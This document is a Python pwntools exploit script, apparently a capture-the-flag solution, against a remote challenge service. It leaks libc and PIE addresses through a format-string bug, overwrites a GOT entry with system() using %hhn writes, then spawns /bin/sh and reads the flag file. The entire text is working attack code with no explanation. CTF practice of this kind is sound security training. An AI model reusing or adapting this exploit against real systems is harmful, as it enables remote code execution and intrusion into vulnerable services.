from pwn import *
import time,sys
context.log_level='error'
LIBC_RET=0x2a1ca; PIE_RET=0x11c9; SYSTEM=0x58740; GOT=0x4010
def build_write(target,data,base_arg,off):
    pairs=sorted([(b,target+i,base_arg+i) for i,b in enumerate(data)],key=lambda x:x[0])
    parts=[];cur=0
    for b,addr,arg in pairs:
        inc=(b-cur)&0xff
        if inc: parts.append('%%%dc'%inc)
        parts.append('%%%d$hhn'%arg); cur=b
    fmt=''.join(parts).encode()
    return fmt+b'A'*(off-len(fmt))+b''.join(p64(target+i) for i in range(len(data)))
p=remote('chal.sunshinectf.games',26001)
p.recvuntil(b'> ');p.sendline(b'%43$p|%47$p')
out=p.recvuntil(b'(2) > ').rsplit(b'(2) >',1)[0]
a=[x for x in out.replace(b'\n',b'').split(b'|') if x.startswith(b'0x')]
libc=int(a[0],16)-LIBC_RET; pie=int(a[1],16)-PIE_RET
system=libc+SYSTEM; got=pie+GOT
buf=build_write(got,list(p64(system)[:6]),8+80//8,80)
p.sendline(buf)
try:p.recvuntil(b'> ',timeout=3)
except:pass
p.sendline(b'/bin/sh');time.sleep(0.5)
p.sendline(b'cat /ctf/flag.txt; echo END')
time.sleep(1)
o=p.recvrepeat(3).decode(errors='replace')
print(o[o.find('sh: 1'):] if 'sh: 1' in o else o)
